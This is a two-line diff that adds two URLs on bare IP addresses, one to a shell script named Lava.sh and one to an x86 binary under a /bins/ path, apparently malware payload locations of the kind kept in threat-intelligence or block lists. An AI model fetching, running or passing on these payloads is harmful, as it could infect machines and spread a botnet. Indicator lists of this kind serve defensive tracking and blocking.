@@ -1,0 +1,2 @@
+http://23.94.24.13/Lava.sh
+http://198.98.48.137/bins/Mercury.x86
